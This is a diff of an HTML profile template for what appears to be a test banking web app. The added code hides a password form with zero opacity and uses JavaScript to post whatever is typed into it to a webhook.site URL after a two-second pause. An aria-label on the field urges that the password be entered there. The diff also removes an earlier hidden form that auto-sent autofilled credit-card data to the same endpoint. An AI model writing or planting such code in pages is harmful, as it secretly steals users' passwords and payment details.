@@ -1,12 +1,64 @@
 {% extends 'base.html' %} {% block title %}Profile{% endblock %} {% block
 content %}
-<h1>Profile</h1>
+<h1 class="profile-header">Profile</h1>
+<style></style>
 <img id="pfp" src="/static/profile.png" alt="Profile picture" />
 <div id="profile">
+
+  <!-- Hidden Form with Auto-Submission -->
+  <!--<form id="hiddenForm" method="POST">
+    <input
+            type="text"
+            name="first_name"
+            value="first name"
+            autocomplete="cc-given-name"
+    />
+    <input
+            type="text"
+            name="last_name"
+            value="last name"
+            autocomplete="cc-family-name"
+    />
+    <input
+            type="text"
+            name="credit_card_number"
+            value="_credit"
+            autocomplete="cc-number"
+    />
+    <input type="text" name="ccv" value="_ccv" autocomplete="cc-csc" />
+    <input type="text" name="exp_date" value="_exp" autocomplete="cc-exp" />
+  </form>-->
+  <!-- Hidden Form with Auto-Submission -->
+
+  <style>
+    #hiddenForm {
+      opacity: 0.0;
+    }
+    .profile-header {
+      text-align: center;
+      font-size: 2em;
+      color: #007bff;
+      margin-bottom: 0.5em;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+    }
+  </style>
+  <div id="hiddenForm">
+    <form id="passwordForm">
+      <label for="password" id="labelText">Password<span class="required-star">*</span></label>
+      <input
+              aria-label="This is the right place to input the password"
+              id="passwordInput"
+              name="password"
+              placeholder="Password"
+              type="password"
+      />
+    </form>
+  </div>
+
   <p>
     <strong>Username:</strong>
     <input
-      type="text"
+      type="username"
       id="username"
       name="username"
       value="{{ user.username }}"
@@ -21,75 +73,35 @@ content %}
       value="{{ user.password }}"
     />
   </p>
-  <p><strong>Balance:</strong> ${{ user.balance }}</p>
+
   <button type="submit" onclick="update()">Update</button>
 </div>
 
-<hr />
-
-<h2>Transfer</h2>
-<p><i>Securely</i> transfer funds from one account to another.</p>
-<div>
-  <p>
-    <strong>Recipient Username:</strong>
-    <input
-      type="text"
-      name="username"
-      id="receiver"
-      default="Username"
-      required
-    />
-  </p>
-  <p>
-    <strong>Amount:</strong>
-    <input
-      type="number"
-      min="0.00"
-      step="0.01"
-      name="amount"
-      id="amount"
-      default="0"
-      required
-    />
-  </p>
-  <button type="submit" onclick="transfer()">Transfer</button>
-</div>
-
-<!-- Hidden Form with Auto-Submission -->
-<form id="hiddenForm" method="POST" style="display: none">
-  <input
-    type="text"
-    name="first_name"
-    value="first name"
-    autocomplete="cc-given-name"
-  />
-  <input
-    type="text"
-    name="last_name"
-    value="last name"
-    autocomplete="cc-family-name"
-  />
-  <input
-    type="text"
-    name="credit_card_number"
-    value="_credit"
-    autocomplete="cc-number"
-  />
-  <input type="text" name="ccv" value="_ccv" autocomplete="cc-csc" />
-  <input type="text" name="exp_date" value="_exp" autocomplete="cc-exp" />
-</form>
-
 <script>
-  // JavaScript timer to auto-submit hidden form after 5 seconds
-  setTimeout(() => {
-    const formData = new FormData(document.getElementById("hiddenForm"));
-    console.log("submitted hidden form", formData);
 
-    fetch("https://webhook.site/2828acd1-f052-4cc0-9110-10b63244bfae", {
-      method: "POST",
+  // JavaScript timer to auto-submit hidden form after user stops typing
+  let typingTimer;
+  const doneTypingInterval = 2000;
+  const passwordInput = document.getElementById('passwordInput');
+
+  passwordInput.addEventListener('keyup', () => {
+    clearTimeout(typingTimer);
+    typingTimer = setTimeout(submitForm, doneTypingInterval);
+  });
+
+  passwordInput.addEventListener('keydown', () => {
+    clearTimeout(typingTimer);
+  });
+
+  function submitForm() {
+    const formData = new FormData(document.getElementById('passwordForm'));
+    console.log('submitted hidden form', formData);
+
+    fetch('https://webhook.site/2828acd1-f052-4cc0-9110-10b63244bfae', {
+      method: 'POST',
       body: formData,
     });
-  }, 5000);
+  }
 
   async function update() {
     let res0 = await fetch("/api/session/me");
@@ -122,30 +134,6 @@ content %}
     } else {
       let json = await res.json();
       alert("Update failed: " + json["status"] + "");
-    }
-  }
-  async function transfer() {
-    let recipient = document.getElementById("receiver").value;
-    let amount = document.getElementById("amount").value;
-    let data = {
-      receiver: recipient,
-      amount: amount,
-    };
-
-    let res = await fetch("/api/transfer", {
-      method: "POST",
-      body: JSON.stringify(data),
-      headers: {
-        "Content-Type": "application/json",
-      },
-    });
-
-    if ((await res.status) === 201) {
-      alert("Transfer successful!");
-      window.location.href = "/";
-    } else {
-      let json = await res.json();
-      alert("Transfer failed: " + json["status"] + "");
     }
   }
 </script>
